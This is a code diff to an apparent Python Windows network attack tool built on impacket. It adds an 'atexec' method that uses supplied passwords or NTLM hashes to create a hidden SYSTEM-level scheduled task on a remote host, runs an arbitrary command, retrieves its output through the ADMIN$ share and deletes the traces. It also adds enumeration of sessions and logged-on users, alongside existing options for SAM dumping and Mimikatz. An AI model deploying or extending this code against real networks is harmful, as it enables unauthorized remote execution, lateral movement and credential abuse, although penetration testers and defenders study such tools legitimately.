@@ -12,10 +12,10 @@ from threading import Thread
 from base64 import b64encode
 from struct import unpack, pack
 from impacket import smbserver, ntlm, winregistry
-from impacket.dcerpc.v5 import transport, scmr, samr, drsuapi, rrp
+from impacket.dcerpc.v5 import transport, scmr, samr, drsuapi, rrp, tsch, srvs, wkst
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
 from impacket.dcerpc.v5.dcom import wmi
-from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5.dtypes import NULL, OWNER_SECURITY_INFORMATION
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.structure import Structure
 from impacket.nt_errors import STATUS_MORE_ENTRIES
@@ -1273,6 +1273,154 @@ class RemoteShellsmbexec():
         self.__outputBuffer = ''
         return result
 
+class TSCH_EXEC:
+    def __init__(self, username='', password='', domain='', hashes=None, command=None):
+        self.__username = username
+        self.__password = password
+        self.__domain = domain
+        self.__lmhash = ''
+        self.__nthash = ''
+        self.__aesKey = None
+        self.__doKerberos = False
+        self.__command = command
+        self.__output = ''
+        self.__tmpName = ''.join([random.choice(string.letters) for _ in range(8)])
+        self.__tmpFileName = self.__tmpName + '.tmp'
+        self.__smbConnection = None
+        self.__dceConnection = None
+        if hashes:
+            self.__lmhash, self.__nthash = hashes.split(':')
+
+    def play(self, addr):
+        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
+        rpctransport = transport.DCERPCTransportFactory(stringbinding)
+
+        if hasattr(rpctransport, 'set_credentials'):
+            # This method exists only for selected protocol sequences.
+            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                         self.__aesKey)
+            rpctransport.set_kerberos(self.__doKerberos)
+        try:
+            self.doStuff(rpctransport)
+        except Exception, e:
+            #import traceback
+            #traceback.print_exc()
+            logging.error(e)
+            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
+                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')
+
+    def doStuff(self, rpctransport):
+        def output_callback(data):
+            print data
+            self.__output += data
+
+        dce = rpctransport.get_dce_rpc()
+        self.__dceConnection = dce
+
+        dce.set_credentials(*rpctransport.get_credentials())
+        dce.connect()
+        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
+        dce.bind(tsch.MSRPC_UUID_TSCHS)
+
+        xml = """<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <CalendarTrigger>
+      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
+      <Enabled>true</Enabled>
+      <ScheduleByDay>
+        <DaysInterval>1</DaysInterval>
+      </ScheduleByDay>
+    </CalendarTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="LocalSystem">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="LocalSystem">
+    <Exec>
+      <Command>cmd.exe</Command>
+      <Arguments>/C %s &gt; %%windir%%\\Temp\\%s 2&gt;&amp;1</Arguments>
+    </Exec>
+  </Actions>
+</Task>
+        """ % (self.__command, self.__tmpFileName)
+        taskCreated = False
+        try:
+            logging.info('Creating task \\%s' % self.__tmpName)
+            tsch.hSchRpcRegisterTask(dce, '\\%s' % self.__tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
+            taskCreated = True
+
+            logging.info('Running task \\%s' % self.__tmpName)
+            tsch.hSchRpcRun(dce, '\\%s' % self.__tmpName)
+
+            done = False
+            while not done:
+                logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % self.__tmpName)
+                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % self.__tmpName)
+                if resp['pLastRuntime']['wYear'] != 0:
+                    done = True
+                else:
+                    sleep(2)
+
+            logging.info('Deleting task \\%s' % self.__tmpName)
+            tsch.hSchRpcDelete(dce, '\\%s' % self.__tmpName)
+            taskCreated = False
+        except tsch.DCERPCSessionError, e:
+            logging.error(e)
+            e.get_packet().dump()
+        finally:
+            if taskCreated is True:
+                tsch.hSchRpcDelete(dce, '\\%s' % self.__tmpName)
+
+        smbConnection = rpctransport.get_smb_connection()
+        self.__smbConnection = smbConnection
+        waitOnce = True
+        while True:
+            try:
+                logging.info('Attempting to read ADMIN$\\Temp\\%s' % self.__tmpFileName)
+                smbConnection.getFile('ADMIN$', 'Temp\\%s' % self.__tmpFileName, output_callback)
+                break
+            except Exception, e:
+                if str(e).find('SHARING') > 0:
+                    sleep(3)
+                elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
+                    if waitOnce is True:
+                        # We're giving it the chance to flush the file before giving up
+                        sleep(3)
+                        waitOnce = False
+                    else:
+                        raise
+                else:
+                    raise
+
+        return self.__output
+
+    def cleanup(self):
+        logging.info('Deleting file ADMIN$\\Temp\\%s' % self.__tmpFileName)
+        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % self.__tmpFileName)
+        self.__dceConnection.disconnect()
+
 class CMDEXEC:
     KNOWN_PROTOCOLS = {
         '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
@@ -1434,6 +1582,62 @@ class RemoteShellwmi():
         self.__outputBuffer = ''
         return result
 
+class RPCENUM():
+    def __init__(self, username, password, domain='', hashes=None):
+        self.__username = username
+        self.__password = password
+        self.__domain = domain
+        self.__lmhash = ''
+        self.__nthash = ''
+        self.__ts = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
+        if hashes:
+            self.__lmhash, self.__nthash = hashes.split(':')
+
+    def connect(self, host, service):
+
+        if service == 'wkssvc':
+            stringBinding = r'ncacn_np:{}[\PIPE\wkssvc]'.format(host)
+        elif service == 'srvsvc':
+            stringBinding = r'ncacn_np:{}[\PIPE\srvsvc]'.format(host)
+
+        rpctransport = transport.DCERPCTransportFactory(stringBinding)
+        rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+
+        if service == 'wkssvc':
+            dce.bind(wkst.MSRPC_UUID_WKST, transfer_syntax = self.__ts)
+        elif service == 'srvsvc':
+            dce.bind(srvs.MSRPC_UUID_SRVS, transfer_syntax = self.__ts)
+
+        return dce, rpctransport
+
+    def enum_logged_on_users(self, host):
+        dce, rpctransport = self.connect(host, 'wkssvc')
+        resp = wkst.hNetrWkstaUserEnum(dce, 0)
+        resp.dump()
+
+        resp = wkst.hNetrWkstaUserEnum(dce, 1)
+        resp.dump()
+
+    def enum_sessions(self, host):
+        dce, rpctransport = self.connect(host, 'srvsvc')
+        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 0)
+        resp.dump()
+
+        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 1)
+        resp.dump()
+
+        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 2)
+        resp.dump()
+
+        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 10)
+        resp.dump()
+
+        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 502)
+        resp.dump()
+
 def normalize_path(path):
     path = r'{}'.format(path)
     path = ntpath.normpath(path)
@@ -1548,6 +1752,14 @@ def connect(host):
             except SessionError as e:
                 print '[-] {}:{} {}'.format(host, args.port, e)
 
+        if args.enum_sessions:
+            rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
+            rpcenum.enum_sessions(host)
+
+        if args.enum_lusers:
+            rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
+            rpcenum.enum_logged_on_users(host)
+
         if args.sam:
             sec_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash)
             sam_dump = sec_dump.dump(smb)
@@ -1574,6 +1786,14 @@ def connect(host):
                 if not args.mimikatz:
                     print '[+] {}:{} {} Executed specified command via WMI:'.format(host, args.port, domain)
                     print result
+
+            elif args.execm == 'atexec':
+                atsvc_exec = TSCH_EXEC(args.user, args.passwd, domain, args.hash, args.command)
+                result = atsvc_exec.play(host)
+                if not args.mimikatz:
+                    print '[+] {}:{} {} Executed specified command via ATEXEC:'.format(host, args.port, domain)
+                    print result
+                atsvc_exec.cleanup()
 
             elif args.execm == 'smbexec':
                 executer = CMDEXEC('{}/SMB'.format(args.port), args.user, args.passwd, domain, args.hash, args.share, args.command)
@@ -1644,11 +1864,13 @@ if __name__ == '__main__':
     rgroup.add_argument("--mimikatz", action='store_true', dest='mimikatz', help='Run Invoke-Mimikatz on target systems')
 
     egroup = parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
-    egroup.add_argument("-S", action="store_true", dest="list_shares", help="List shares")
-    egroup.add_argument("-U", action='store_true', dest='enum_users', help='Enumerate users')
+    egroup.add_argument("--shares", action="store_true", dest="list_shares", help="List shares")
+    egroup.add_argument("--sessions", action='store_true', dest='enum_sessions', help='Enumerate active sessions')
+    egroup.add_argument("--users", action='store_true', dest='enum_users', help='Enumerate users')
+    egroup.add_argument("--lusers", action='store_true', dest='enum_lusers', help='Enumerate logged on users')
 
     cgroup = parser.add_argument_group("Command Execution", "Options for executing commands")
-    cgroup.add_argument('--execm', choices={"wmi", "smbexec"}, dest="execm", default="wmi", help="Method to execute the command (default: wmi)")
+    cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, dest="execm", default="wmi", help="Method to execute the command (default: wmi)")
     cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
     cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
 
